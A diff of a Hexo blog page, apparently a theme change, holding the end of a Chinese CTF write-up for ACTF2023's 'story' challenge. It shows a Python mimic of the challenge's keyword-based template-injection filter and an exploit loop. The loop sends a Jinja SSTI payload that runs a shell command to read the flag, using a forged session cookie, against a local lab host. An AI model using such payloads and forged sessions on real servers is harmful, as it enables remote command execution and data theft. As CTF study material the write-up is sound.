&#x27;request&#x27;,&#x27;args&#x27;,&#x27;cookies&#x27;,&#x27;values&#x27;,&#x27;|&#x27;,&#x27;\\x&#x27;,&#x27;getitem&#x27;]                  # rule 6</span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">def transfrom(number):</span><br><span class="line">    a = random.randint(0,20)</span><br><span class="line">    b = random.randint(0,100)</span><br><span class="line">    return (a * number + b) % 6</span><br><span class="line"></span><br><span class="line">def singel_waf(input, rules):</span><br><span class="line">    input = input.lower()</span><br><span class="line">    for rule in rules:</span><br><span class="line">        if rule in input:</span><br><span class="line">            return False</span><br><span class="line">    return True</span><br><span class="line"></span><br><span class="line">def minic_waf(input):</span><br><span class="line">    waf_seq = random.sample(range(21),3)</span><br><span class="line">    for index in range(len(waf_seq)):</span><br><span class="line">        waf_seq[index] = transfrom(waf_seq[index])</span><br><span class="line">        print(rule[waf_seq[index]])</span><br><span class="line">        if not singel_waf(input, rule[waf_seq[index]]):</span><br><span class="line">            return False</span><br><span class="line">    return True</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import random</span><br><span class="line">rule = [</span><br><span class="line">    [&#x27;\\x&#x27;,&#x27;[&#x27;,&#x27;]&#x27;,&#x27;.&#x27;,&#x27;getitem&#x27;,&#x27;print&#x27;,&#x27;request&#x27;,&#x27;args&#x27;,&#x27;cookies&#x27;,&#x27;values&#x27;,&#x27;getattribute&#x27;,&#x27;config&#x27;],                   # rule 1</span><br><span class="line">    [&#x27;(&#x27;,&#x27;]&#x27;,&#x27;getitem&#x27;,&#x27;_&#x27;,&#x27;%&#x27;,&#x27;print&#x27;,&#x27;config&#x27;,&#x27;args&#x27;,&#x27;values&#x27;,&#x27;|&#x27;,&#x27;\&#x27;&#x27;,&#x27;\&quot;&#x27;,&#x27;dict&#x27;,&#x27;,&#x27;,&#x27;join&#x27;,&#x27;.&#x27;,&#x27;set&#x27;],              # rule 2</span><br><span class="line">    [&#x27;\&#x27;&#x27;,&#x27;\&quot;&#x27;,&#x27;dict&#x27;,&#x27;,&#x27;,&#x27;config&#x27;,&#x27;join&#x27;,&#x27;\\x&#x27;,&#x27;)&#x27;,&#x27;[&#x27;,&#x27;]&#x27;,&#x27;attr&#x27;,&#x27;__&#x27;,&#x27;list&#x27;,&#x27;globals&#x27;,&#x27;.&#x27;],                           # rule 3</span><br><span class="line">    [&#x27;[&#x27;,&#x27;)&#x27;,&#x27;getitem&#x27;,&#x27;request&#x27;,&#x27;.&#x27;,&#x27;|&#x27;,&#x27;config&#x27;,&#x27;popen&#x27;,&#x27;dict&#x27;,&#x27;doc&#x27;,&#x27;\\x&#x27;,&#x27;_&#x27;,&#x27;\&#123;\&#123;&#x27;,&#x27;mro&#x27;],                          # rule 4</span><br><span class="line">    [&#x27;\\x&#x27;,&#x27;(&#x27;,&#x27;)&#x27;,&#x27;config&#x27;,&#x27;args&#x27;,&#x27;cookies&#x27;,&#x27;values&#x27;,&#x27;[&#x27;,&#x27;]&#x27;,&#x27;\&#123;\&#123;&#x27;,&#x27;.&#x27;,&#x27;request&#x27;,&#x27;|&#x27;,&#x27;attr&#x27;],                          # rule 5</span><br><span class="line">    [&#x27;print&#x27;, &#x27;class&#x27;, &#x27;import&#x27;, &#x27;eval&#x27;, &#x27;__&#x27;, &#x27;request&#x27;,&#x27;args&#x27;,&#x27;cookies&#x27;,&#x27;values&#x27;,&#x27;|&#x27;,&#x27;\\x&#x27;,&#x27;getitem&#x27;]                  # rule 6</span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">def transfrom(number):</span><br><span class="line">    a = random.randint(0,20)</span><br><span class="line">    b = random.randint(0,100)</span><br><span class="line">    return (a * number + b) % 6</span><br><span class="line"></span><br><span class="line">def singel_waf(input, rules):</span><br><span class="line">    input = input.lower()</span><br><span class="line">    for rule in rules:</span><br><span class="line">        if rule in input:</span><br><span class="line">            return False</span><br><span class="line">    return True</span><br><span class="line"></span><br><span class="line">def minic_waf(input):</span><br><span class="line">    waf_seq = random.sample(range(21),3)</span><br><span class="line">    for index in range(len(waf_seq)):</span><br><span class="line">        waf_seq[index] = transfrom(waf_seq[index])</span><br><span class="line">        print(rule[waf_seq[index]])</span><br><span class="line">        if not singel_waf(input, rule[waf_seq[index]]):</span><br><span class="line">            return False</span><br><span class="line">    return True</span><br></pre></td></tr></table></figure>
 
 <p>本地打，不到3分钟就摇到了。</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">story = &quot;&#123;&#123;lipsum[&#x27;_&#x27;&#x27;_glo&#x27;&#x27;bals_&#x27;&#x27;_&#x27;][&#x27;_&#x27;&#x27;_builtins_&#x27;&#x27;_&#x27;][&#x27;_&#x27;&#x27;_impo&#x27;&#x27;rt_&#x27;&#x27;_&#x27;](&#x27;os&#x27;).popen(&#x27;cat f*&#x27;).read()&#125;&#125;&quot;</span><br><span class="line">cookies = &#123;&#x27;session&#x27;:&#x27;eyJjYXB0Y2hhIjoiZFRyRSIsInVzZXJuYW1lIjoiMTIzIiwidmlwIjp0cnVlfQ.ZUD_lw.T0MsH0UtcsajVwlAxS748Hh3_jU; HttpOnly; Path=/&#x27;&#125;</span><br><span class="line">import time</span><br><span class="line">while True:</span><br><span class="line">    res = requests.post(&#x27;http://192.168.190.129:5001/write&#x27;,json=&#123;&quot;story&quot;:story&#125;,cookies=cookies)</span><br><span class="line">    if &#x27;success&#x27; in res.text:</span><br><span class="line">        print(res.headers)</span><br><span class="line">        print(res.cookies)</span><br><span class="line">        break</span><br><span class="line">    print(&#x27;failed!&#x27;)</span><br><span class="line">    time.sleep(0.5)</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">story = &quot;&#123;&#123;lipsum[&#x27;_&#x27;&#x27;_glo&#x27;&#x27;bals_&#x27;&#x27;_&#x27;][&#x27;_&#x27;&#x27;_builtins_&#x27;&#x27;_&#x27;][&#x27;_&#x27;&#x27;_impo&#x27;&#x27;rt_&#x27;&#x27;_&#x27;](&#x27;os&#x27;).popen(&#x27;cat f*&#x27;).read()&#125;&#125;&quot;</span><br><span class="line">cookies = &#123;&#x27;session&#x27;:&#x27;eyJjYXB0Y2hhIjoiZFRyRSIsInVzZXJuYW1lIjoiMTIzIiwidmlwIjp0cnVlfQ.ZUD_lw.T0MsH0UtcsajVwlAxS748Hh3_jU; HttpOnly; Path=/&#x27;&#125;</span><br><span class="line">import time</span><br><span class="line">while True:</span><br><span class="line">    res = requests.post(&#x27;http://192.168.190.129:5001/write&#x27;,json=&#123;&quot;story&quot;:story&#125;,cookies=cookies)</span><br><span class="line">    if &#x27;success&#x27; in res.text:</span><br><span class="line">        print(res.headers)</span><br><span class="line">        print(res.cookies)</span><br><span class="line">        break</span><br><span class="line">    print(&#x27;failed!&#x27;)</span><br><span class="line">    time.sleep(0.5)</span><br></pre></td></tr></table></figure>
 
-<p><img src="https://main-blog-imge-cache-kdiuqgtucb.cn-shenzhen.fcapp.run/image?image=2023/10/31/ACTF2023/image-20231031220924167.png" alt="image-20231031220924167.png"><br><img src="https://main-blog-imge-cache-kdiuqgtucb.cn-shenzhen.fcapp.run/image?image=2023/10/31/ACTF2023/1698761463686.png" alt="1698761463686.png"></p>
-
-    </div>
-
-    
-    
-    
-
-      <footer class="post-footer">
-
-        
-
-
-        
-    <div class="post-nav">
-      <div class="post-nav-item">
-    <a href="/2023/10/31/browser-test/" rel="prev" title="浏览器请求实验">
-      <i class="fa fa-chevron-left"></i> 浏览器请求实验
-    </a></div>
-      <div class="post-nav-item">
-    <a href="/2023/11/29/TPCTF2023/" rel="next" title="TPCTF2023">
-      TPCTF2023 <i class="fa fa-chevron-right"></i>
-    </a></div>
-    </div>
-      </footer>
-    
-  </article>
-  
-  
-  
-
-
-
-          </div>
-          
-
-<script>
-  window.addEventListener('tabs:register', () => {
-    let { activeClass } = CONFIG.comments;
-    if (CONFIG.comments.storage) {
-      activeClass = localStorage.getItem('comments_active') || activeClass;
-    }
-    if (activeClass) {
-      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
-      if (activeTab) {
-        activeTab.click();
-      }
-    }
-  });
-  if (CONFIG.comments.storage) {
-    window.addEventListener('tabs:click', event => {
-      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
-      let commentClass = event.target.classList[1];
-      localStorage.setItem('comments_active', commentClass);
-    });
-  }
-</script>
-
-        </div>
-          
-  
-  <div class="toggle sidebar-toggle">
-    <span class="toggle-line toggle-line-first"></span>
-    <span class="toggle-line toggle-line-middle"></span>
-    <span class="toggle-line toggle-line-last"></span>
-  </div>
-
-  <aside class="sidebar">
-    <div class="sidebar-inner">
-
-      <ul class="sidebar-nav motion-element">
-        <li class="sidebar-nav-toc">
-          Table of Contents
-        </li>
-        <li class="sidebar-nav-overview">
-          Overview
-        </li>
-      </ul>
-
-      <!--noindex-->
-      <div class="post-toc-wrap sidebar-panel">
-          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#craftcms"><span class="nav-number">1.</span> <span class="nav-text">craftcms</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Ave-Mujica%E2%80%99s-Masquerade"><span class="nav-number">2.</span> <span class="nav-text">Ave Mujica’s Masquerade</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#easylatex"><span class="nav-number">3.</span> <span class="nav-text">easylatex</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#new-URL"><span class="nav-number">3.1.</span> <span class="nav-text">new URL</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#bot-visit-%E7%A9%BF%E8%B6%8A"><span class="nav-number">3.2.</span> <span class="nav-text">bot visit 穿越</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#CSP"><span class="nav-number">3.3.</span> <span class="nav-text">CSP</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#base-js"><span class="nav-number">3.4.</span> <span class="nav-text">base.js</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#story"><span class="nav-number">4.</span> <span class="nav-text">story</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%BE%97%E5%88%B0%E9%9A%8F%E6%9C%BA%E7%A7%8D%E5%AD%90"><span class="nav-number">4.1.</span> <span class="nav-text">得到随机种子</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%91%873%E4%B8%AA%E7%9B%B8%E5%90%8C%E7%9A%84waf"><span class="nav-number">4.2.</span> <span class="nav-text">摇3个相同的waf</span></a></li></ol></li></ol></div>
-      </div>
-      <!--/noindex-->
-
-      <div class="site-overview-wrap sidebar-panel">
-        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
-    <img class="site-author-image" itemprop="image" alt="unknown"
-      src="/images/unknown.jpg">
-  <p class="site-author-name" itemprop="name">unknown</p>
-  <div class="site-description" itemprop="description">memories matter</div>
-</div>
-<div class="site-state-wrap motion-element">
-  <nav class="site-state">
-      <div class="site-state-item site-state-posts">
-          <a href="/archives/">
-        
-          <span class="site-state-item-count">25</span>
-          <span class="site-state-item-name">posts</span>
-        </a>
-      </div>
-      <div class="site-state-item site-state-categories">
-            <a href="/categories/">
-          
-        <span class="site-state-item-count">9</span>
-        <span class="site-state-item-name">categories</span></a>
-      </div>
-  </nav>
-</div>
-
-
-
-      </div>
+<p><img src="https://unk-blog-image.oss-cn-shenzhen.aliyuncs.com/images/ACTF2023/image-20231031220924167.png" alt="image-20231031220924167.png"><br><img src="https://unk-blog-image.oss-cn-shenzhen.aliyuncs.com/images/ACTF2023/1698761463686.png" alt="1698761463686.png"></p>
 
     </div>
-  </aside>
-  <div id="sidebar-dimmer"></div>
 
-
-      </div>
-    </main>
-
-    <footer class="footer">
-      <div class="footer-inner">
-        
-
-        
-
-<div class="copyright">
-  
-  &copy; 
-  <span itemprop="copyrightYear">2023</span>
-  <span class="with-love">
-    <i class="fa fa-heart"></i>
-  </span>
-  <span class="author" itemprop="copyrightHolder">unknown</span>
+    
 </div>
-  <div class="powered-by">Powered by <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://pisces.theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Pisces</a>
-  </div>
 
-        
+    
+    <div class="footer" id="footer">
+    <p>Copyright © 2020 <a class="flink" target="_blank" rel="noopener" href="https://hexo.io">Hexo</a>-<a class="flink" target="_blank" rel="noopener" href="https://github.com/sanjinhub/hexo-theme-geek">Geek</a>.
+    </p>
+</div>
 
+<script src="/js/js.js"></script>
 
+<style type="text/css">
+.v * {
+    color: #698fca;
+}
 
+.v .vlist .vcard .vhead .vsys {
+    color: #3a3e4a;
+}
 
+.v .vlist .vcard .vh .vmeta .vat {
+    color: #638fd5;
+}
 
+.v .vlist .vcard .vhead .vnick {
+    color: #6ba1ff;
+}
 
+.v a {
+    color: #8696b1;
+}
 
-
-      </div>
-    </footer>
-  </div>
-
-  
-  <script src="/lib/anime.min.js"></script>
-  <script src="/lib/velocity/velocity.min.js"></script>
-  <script src="/lib/velocity/velocity.ui.min.js"></script>
-
-<script src="/js/utils.js"></script>
-
-<script src="/js/motion.js"></script>
-
-
-<script src="/js/schemes/pisces.js"></script>
-
-
-<script src="/js/next-boot.js"></script>
-
-
-
-
-  
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-  
-
-  
-
+.v .vlist .vcard .vhead .vnick:hover {
+    color: #669bfc;
+}
+</style>
 </body>
+
 </html>
